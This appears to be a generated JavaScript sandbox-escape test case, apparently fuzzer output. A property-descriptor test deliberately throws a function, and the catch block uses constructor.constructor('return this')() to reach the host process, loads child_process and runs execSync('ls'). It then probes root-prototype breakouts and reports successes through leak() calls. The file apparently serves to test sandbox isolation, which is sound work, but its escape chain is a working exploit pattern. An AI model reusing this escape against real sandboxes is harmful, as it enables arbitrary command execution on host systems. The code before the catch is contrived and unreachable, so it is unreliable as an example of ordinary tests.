try {
    var obj;
    var prop = 'prop';
    function reset(desc) {
        let REPLACER = 23;
        desc.value = prop;
        obj = Object.defineProperty({}, prop, desc);
    }
    function checkDesc(desc) {
        throw () => {
            return () => {
            };
        };
        reset(desc);
        assert(verifyProperty(obj, prop, desc));
        reset(desc);
        assert(verifyProperty(obj, prop, {
            value: 'prop',
            enumerable: desc.enumerable
        }));
        reset(desc);
        assert(verifyProperty(obj, prop, {
            value: 'prop',
            writable: desc.writable
        }));
        reset(desc);
        assert(verifyProperty(obj, prop, {
            value: 'prop',
            configurable: desc.configurable
        }));
        reset(desc);
        assert(verifyProperty(obj, prop, {
            value: 'prop',
            configurable: desc.configurable,
            enumerable: desc.enumerable
        }));
        reset(desc);
        assert(verifyProperty(obj, prop, {
            value: 'prop',
            configurable: desc.configurable,
            writable: desc.writable
        }));
        reset(desc);
        assert(verifyProperty(obj, prop, {
            value: 'prop',
            writable: desc.writable,
            enumerable: desc.enumerable
        }));
        reset(desc);
        assert(verifyProperty(obj, prop, {
            value: 'prop',
            enumerable: desc.enumerable,
            configurable: desc.configurable
        }));
    }
    checkDesc({
        enumerable: true,
        configurable: true,
        writable: true
    });
    checkDesc({
        enumerable: false,
        writable: false,
        configurable: false
    });
    checkDesc({
        enumerable: true,
        writable: false,
        configurable: false
    });
    checkDesc({
        enumerable: false,
        writable: true,
        configurable: false
    });
    checkDesc({
        enumerable: false,
        writable: false,
        configurable: true
    });
    checkDesc({
        enumerable: true,
        writable: false,
        configurable: true
    });
    checkDesc({
        enumerable: true,
        writable: true,
        configurable: false
    });
    checkDesc({
        enumerable: false,
        writable: true,
        configurable: true
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}